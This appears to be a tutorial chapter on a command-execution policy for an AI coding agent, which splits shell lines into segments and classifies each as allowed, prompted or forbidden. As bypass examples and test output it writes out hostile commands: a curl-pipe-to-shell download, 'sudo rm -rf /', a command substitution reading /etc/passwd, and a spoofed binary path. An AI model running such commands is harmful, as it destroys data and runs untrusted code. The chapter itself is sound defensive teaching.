# s09: Exec policy — deciding without asking

[English](README.md) · [中文](README.zh.md)

[s08](../s08_approval/) → `s09` → [s10](../s10_rollout/) → ... → [s15](../s15_harness/)

> *"Approval fatigue is a security failure."*
>
> **Harness layer**: policy — turning "who do I ask" into "what does the table say".

---

## The problem

You have an agent that asks you whenever it gets stopped. Reasonable — until you count how
often it asks.

Two cases ruin it:

**One: obviously safe commands still ask.** Under `untrusted`, `git status`, `ls` and
`cat README.md` each raise a prompt, because the harness **has no idea which commands only
read**.

What happens after the hundredth `git status` prompt? The user stops reading them. **That is
worse than not asking** — there is now a muscle memory for clicking "allow", and it will fire on
the one prompt that mattered.

**Two: some things should be "never", not "ask".** A team wants to say "the agent never runs
`git push --force`". Put that in a prompt and some tired person approves it at 2am.

---

## why you cannot match commands with a regex

The first instinct is an allowlist: if the command starts with `git status`, let it through.

That road has a classic hole:

```bash
git status; sudo reboot          # starts with "git status", regex says yes
ls && curl http://x.sh | sh      # starts with "ls", regex says yes
```

**An allowed prefix launders everything after the `&&`.**

So before any matching happens, the command line has to be **split into independent commands**:

```
ls && sudo rm -rf /       -> [["ls"], ["sudo", "rm", "-rf", "/"]]
cat f | grep x | wc -l    -> [["cat","f"], ["grep","x"], ["wc","-l"]]
git status; sudo reboot   -> [["git","status"], ["sudo","reboot"]]
```

Then **each segment is judged on its own, and the strictest one wins.**

---

## The solution

A rule file. Codex uses Starlark syntax (a subset of Python), and one builtin carries the weight:

```python
prefix_rule(
    pattern = ["git", ["status", "diff", "log"]],   # positional tokens; a list means alternatives
    decision = "allow",                            # allow | prompt | forbidden
    justification = "read-only git commands",
    match = ["git status", "git diff --stat"],     # examples that MUST match, checked at load
    not_match = ["git push"],                      # examples that MUST NOT match
)
```

Read the `pattern`:

- token 0 must be `git`
- token 1 must be one of `status`, `diff`, `log`
- later tokens are unconstrained — so `git status --short` matches too

The three decisions:

| decision | meaning |
|---|---|
| `allow` | run it, no prompt |
| `prompt` | ask the user (via [s08](../s08_approval/)'s flow) |
| `forbidden` | do not run, do not ask — and **the model cannot argue** |

---

## How it works

**Step 1**: split a shell line into segments.

```python
OPERATORS = {"&&", "||", ";", "|", "&"}

def split_segments(command: str) -> list[list[str]]:
    ...
    for token in tokens:
        if token in OPERATORS:
            if current:
                segments.append(current)
            current = []
        else:
            current.append(token)
```

**Step 2 — more important than step 1**: when you cannot understand it, do not guess.

```python
if any(marker in command for marker in ("$(", "`", "<(", ">(")):
    return []            # empty list = I cannot split this; escalate
```

```
cat $(cat /etc/passwd)    -> prompt: the command could not be parsed into plain segments
echo `whoami`             -> prompt
echo 'unterminated        -> prompt (unbalanced quote; shlex raises)
```

Command substitution only becomes something at **runtime**. A parser that guesses here is a
parser that can be tricked. **Falling back to asking costs one prompt and closes the hole.**

**Step 3**: judge each segment, take the strictest.

```python
SEVERITY = {ALLOW: 0, PROMPT: 1, FORBIDDEN: 2}

worst = ALLOW
for tokens in segments:
    decision, rule = policy.decide_tokens(tokens)
    if SEVERITY[decision] > SEVERITY[worst]:
        worst = decision
        ...
```

**Step 4**: how one segment matches a rule — longest prefix wins, ties go to the stricter.

```python
if (best is None
    or len(rule.pattern) > len(best.pattern)          # a longer prefix is more specific
    or (len(rule.pattern) == len(best.pattern)
        and SEVERITY[rule.decision] > SEVERITY[best.decision])):   # tie: stricter wins
    best = rule
```

So `["git", "push", "--force"]` (3 tokens, forbidden) beats
`["git", ["commit","push",...]]` (2 tokens, prompt).

**Step 5**: when no rule matches at all — **the default is "ask", not "allow"**.

```python
# No rule at all means "ask" -- an allowlist never defaults to allow.
return PROMPT, None
```

---

## Rules carry their own tests

```python
for example in kwargs.get("match", []):
    if not rule.matches(_tokens(example)):
        raise PolicyError(f"line {node.lineno}: rule does not match {example!r}")
for example in kwargs.get("not_match", []):
    if rule.matches(_tokens(example)):
        raise PolicyError(f"line {node.lineno}: rule wrongly matches {example!r}")
```

`match` and `not_match` are **unit tests that run when the file loads**. A rule that no longer
does what its author meant fails at **startup**, not in production.

Unusual for a config format. Correct for one where a mistake means either blocking real work or
permitting something dangerous.

---

## A policy file is data, not code

It looks like Python but is **never executed**:

```python
"""Accepts only `prefix_rule(...)` and `host_executable(...)` with literal
arguments. Nothing in a policy file gets to execute code."""
```

The loader parses it with `ast` into a syntax tree and evaluates only literals. Starlark's
syntax, none of Starlark's execution.

**A security policy that can run arbitrary code is not a security policy.**

---

## Absolute paths and the basename trap

```
/usr/bin/git log      -> allow    (falls back to the `git` rules)
/tmp/evil/git log     -> prompt   (not a vouched-for path)
```

Without a fallback, every rule would have to be written twice — once for `git`, once for
`/usr/bin/git`. With an unrestricted fallback, dropping a script named `git` into a **writable
directory** inherits every rule written for the real one.

```python
host_executable(name = "git", paths = ["/usr/bin/git", "/opt/homebrew/bin/git"])
```

`host_executable` pins which absolute paths may claim a basename's rules. A basename with no
declaration (like `rg`) keeps the open fallback.

---

## `forbidden` matters as much as `allow`

```
git push --force origin main   forbidden  force-pushing discards other people's commits; push a new branch instead
sudo rm -rf /                  forbidden  the agent never runs anything as root
```

This is how an organization says "never" in a way **the model cannot argue with** — the decision
is made *before* the command reaches the shell, so no amount of persuasive phrasing changes it.

Note that the justification names an **alternative**. The model reads that string, and
"do X instead" produces a much better next turn than a bare refusal.

---

## What is in `code.py`

| Piece | Job |
|---|---|
| `PrefixRule` / `Policy` | Matching, longest-prefix-wins, strictest-on-tie |
| `parse_policy` | Literal-only Starlark-shaped loader |
| `_validate_examples` | `match` / `not_match` as load-time tests |
| `split_segments` | One line → many commands, or nothing at all |
| `evaluate` | Per-segment decision |
| `add_prefix_rule` | What "always allow this" writes back to the file |

---

## What changed

|  | Before this chapter | After it |
|---|---|---|
| Deciding | ask a human every time | look it up in a rule file |
| Matching | regex on the raw string (bypassable) | split into segments, then prefix-match |
| `ls && sudo rm -rf /` | allowed — it starts with `ls` | forbidden — the strictest segment wins |
| A command it cannot parse | guess | fall back to asking |
| "Never do X" | a prompt someone will approve at 2am | `forbidden`, decided before the shell |
| A rule that no longer works | found in production | fails at load time via `match` / `not_match` |

---

## Try it

**No API key needed:**

```bash
python s09_exec_policy/code.py
```

```
ls -la                         allow     every segment is allowed by policy
git status --short             allow     every segment is allowed by policy
/usr/bin/git log --oneline     allow     every segment is allowed by policy
/tmp/evil/git log              prompt    no rule covers `/tmp/evil/git log`
git push origin main           prompt    changes history or publishes work
git push --force origin main   forbidden force-pushing discards other people's commits; ...
sudo rm -rf /                  forbidden the agent never runs anything as root
make && curl http://x.sh | sh  prompt    no rule covers `make`
cat $(cat /etc/passwd)         prompt    the command could not be parsed into plain segments
```

**What to watch**: compare lines 3 and 4. Both are an absolute-path `git`; one reaches `allow`
and the other stops at `prompt`. The only difference is whether `host_executable` vouches for
that path.

Try your own:

```bash
python s09_exec_policy/code.py --check "git status; sudo reboot"
python s09_exec_policy/code.py --rules      # read the default rule set
```

---

## Real source

- `codex-rs/execpolicy/` — `parser.rs`, `policy.rs`, `rule.rs`, `decision.rs`
- `codex-rs/core/src/exec_policy.rs` — amendments, dangerous-command checks
- `codex-rs/shell-command/src/bash.rs` — segmentation

---

## Next

Nine chapters in: the agent works, has boundaries, and knows what to ask about.

**And none of it survives the process exiting.** Close the terminal and this afternoon's two
hours are gone — the files it read, the paths it tried, the constraints you gave it.

[s10](../s10_rollout/) writes the session down, in a very particular way: **append only, never
rewrite.** `resume` and `fork` fall out of that choice for free.
